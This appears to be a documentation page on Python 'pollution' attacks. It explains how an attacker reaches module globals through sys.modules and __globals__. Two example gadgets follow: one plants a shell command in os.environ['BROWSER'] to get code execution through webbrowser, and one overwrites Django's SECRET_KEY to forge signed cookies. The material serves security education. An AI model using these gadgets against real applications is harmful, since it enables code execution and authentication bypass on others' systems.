---
title: "Modules"
weight: 2
---

# Modules

When a module `mod` is accessible, the attacker can modify any of its module-level globals. Module pollution is powerful because module globals are shared across every importer.

## Access mechanism: global variable reference

A Python module's global namespace is a dictionary on the module object. Reads such as `from mod import v` or `mod.v` resolve to entries in that dictionary, so writing to `mod.__dict__["v"]` or `mod.v` changes what every importer sees.

```python
# mod.py
def f():
    global v
    v               # attacker controls the global variable

# other.py
from mod import v   # reads mod.__dict__["v"]
v                   # the polluted value is used here
```

## How to reach a module

Modules are accessible through three routes.

1. **`sys.modules`**. The global module cache contains every loaded module by name. Reaching `sys.modules` once means reaching `os`, `subprocess`, `django.conf`, and anything else the application has imported.
2. **`f.__globals__`**. Every function carries a reference to its defining module's `__dict__`. Any traversal that passes through a function reaches that function's module globals (covered on the [Functions]({{< relref "functions" >}}) page).
3. **Direct attribute access**. If the attacker's traversal already holds the module object as a value, attribute access on it lands directly in the module's globals.

```python
# Reaching sys.modules from any object:
obj.__class__.__init__.__globals__["sys"].modules

# Or stepping into a single module's globals via any of its functions:
obj.__class__.__init__.__globals__   # the defining module's namespace
```

### Example: polluting `os.environ` for RCE

```python
import os
import webbrowser

os.environ.get("BROWSER")           # returns whatever the user set, e.g. "firefox"

# Attacker payload (Item-Set on os.environ via __class__.__init__.__globals__):
#   os.environ["BROWSER"] = "/bin/sh -c 'id > /tmp/pwned'"

import antigravity                  # calls webbrowser.open(), which now executes the shell command
```

### Example: polluting `django.conf.settings.SECRET_KEY` for auth bypass

```python
from django.conf import settings
from django.core.signing import Signer

Signer().sign("payload")            # signs with the real, unknown SECRET_KEY

# Attacker payload (Attr-Set on settings via __init__.__globals__["sys"].modules["django.conf"]):
#   settings.SECRET_KEY = "attacker_known_value"

Signer().sign("payload")            # signs with the attacker's known key, so the attacker can forge cookies
```

Both patterns are detailed on the [RCE gadgets]({{< relref "/docs/gadgets/rce" >}}) and [authentication bypass gadgets]({{< relref "/docs/gadgets/auth-bypass" >}}) pages.
